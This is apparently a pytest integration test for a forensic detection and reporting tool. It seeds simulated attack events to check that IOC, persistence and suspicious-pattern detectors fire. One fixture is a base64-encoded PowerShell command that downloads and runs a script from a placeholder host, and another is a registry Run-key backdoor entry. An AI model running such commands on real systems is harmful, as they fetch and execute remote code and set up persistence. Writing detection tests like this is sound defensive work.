"""Integration tests for detection engines and reporting."""

import uuid
from datetime import datetime, timezone
import pytest
from httpx import ASGITransport, AsyncClient

from app.analysis.ioc_matcher import run_ioc_matching
from app.analysis.persistence_detector import run_persistence_detection
from app.analysis.suspicious_patterns import run_suspicious_pattern_detection
from app.analysis.timeline_builder import build_full_timeline
from app.database import get_db_connection
from app.main import app
from app.reporting.generator import generate_report


@pytest.mark.asyncio
async def test_detection_and_reporting_flow():
    """Verify that events trigger suspicious patterns and persistence, and generate a report."""
    case_id = str(uuid.uuid4())
    art_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()

    async with get_db_connection() as db:
        # 1. Setup Case & Artifact
        await db.execute(
            """
            INSERT INTO cases (id, name, description, status, created_at, updated_at, classification)
            VALUES (?, ?, ?, 'open', ?, ?, 'incident')
            """,
            (case_id, "Test Attack Investigation", "Simulated attack analysis", now, now),
        )

        await db.execute(
            """
            INSERT INTO artifacts (id, case_id, filename, filepath, artifact_type, sha256, import_time)
            VALUES (?, ?, 'sample.evtx', 'dummy/path', 'evtx', 'dummyhash123', ?)
            """,
            (art_id, case_id, now),
        )

        # 2. Insert suspicious events:
        # Event A: Encoded PowerShell (should trigger SUS-001)
        ev1_id = str(uuid.uuid4())
        await db.execute(
            """
            INSERT INTO events (
                id, case_id, artifact_id, timestamp, source_type, event_type, severity,
                process_name, command_line, is_suspicious, is_ioc_match
            ) VALUES (?, ?, ?, ?, 'evtx', 'process_create', 'low', 'powershell.exe',
                     'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbABvAGMAYQBsAC8AcAAuAHAAcwAxACcAKQA=',
                     0, 0)
            """,
            (ev1_id, case_id, art_id, now),
        )

        # Event B: Registry Run Key modification (should trigger persistence detection)
        ev2_id = str(uuid.uuid4())
        await db.execute(
            """
            INSERT INTO events (
                id, case_id, artifact_id, timestamp, source_type, event_type, severity,
                registry_key, registry_value, is_suspicious, is_ioc_match
            ) VALUES (?, ?, ?, ?, 'registry', 'persistence', 'high',
                     'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor', 'C:\\temp\\backdoor.exe',
                     0, 0)
            """,
            (ev2_id, case_id, art_id, now),
        )

        # Event C: Known malicious IP indicator match
        ev3_id = str(uuid.uuid4())
        await db.execute(
            """
            INSERT INTO events (
                id, case_id, artifact_id, timestamp, source_type, event_type, severity,
                dest_ip, is_suspicious, is_ioc_match
            ) VALUES (?, ?, ?, ?, 'sysmon', 'network_connection', 'low',
                     '198.51.100.42', 0, 0)
            """,
            (ev3_id, case_id, art_id, now),
        )

        # Insert IOC for 198.51.100.42
        ioc_id = str(uuid.uuid4())
        await db.execute(
            """
            INSERT INTO iocs (id, case_id, ioc_type, ioc_value, description, confidence, created_at)
            VALUES (?, ?, 'ip', '198.51.100.42', 'Known C2 server IP', 'high', ?)
            """,
            (ioc_id, case_id, now),
        )
        await db.commit()

        # 3. Run Detection Engines
        ioc_hits = await run_ioc_matching(case_id, db)
        assert ioc_hits >= 1

        persist_hits = await run_persistence_detection(case_id, db)
        assert persist_hits >= 1

        sus_hits = await run_suspicious_pattern_detection(case_id, db)
        assert sus_hits >= 1

        # 4. Check Timeline Builder
        timeline = await build_full_timeline(case_id, db)
        assert timeline["total_events"] == 3
        assert len(timeline["events"]) == 3
        assert timeline["summary"]["suspicious_count"] >= 1

        # 5. Generate Full Report
        report = await generate_report(case_id, db, report_type="full", analyst_name="Lead Hunter")
        assert report["report_id"] is not None
        assert report["findings_count"] >= 3

        # Generate Executive Report
        exec_report = await generate_report(case_id, db, report_type="executive", analyst_name="Lead Hunter")
        assert exec_report["report_id"] is not None


@pytest.mark.asyncio
async def test_api_analysis_and_reports():
    """Test full analysis endpoints via HTTP client."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Create case
        c_resp = await client.post("/api/v1/cases", json={"name": "API Test Case", "classification": "threat_hunt"})
        assert c_resp.status_code == 201
        case_id = c_resp.json()["id"]

        # Trigger analysis
        a_resp = await client.post(f"/api/v1/cases/{case_id}/analyze")
        assert a_resp.status_code == 200
        data = a_resp.json()
        assert data["status"] == "completed"

        # List findings
        f_resp = await client.get(f"/api/v1/cases/{case_id}/findings")
        assert f_resp.status_code == 200

        # Generate report via API
        r_resp = await client.post(f"/api/v1/cases/{case_id}/reports/generate", json={"report_type": "full"})
        assert r_resp.status_code == 201
        assert "filename" in r_resp.json()

        # List reports
        list_r = await client.get(f"/api/v1/cases/{case_id}/reports")
        assert list_r.status_code == 200
        assert len(list_r.json()) >= 1
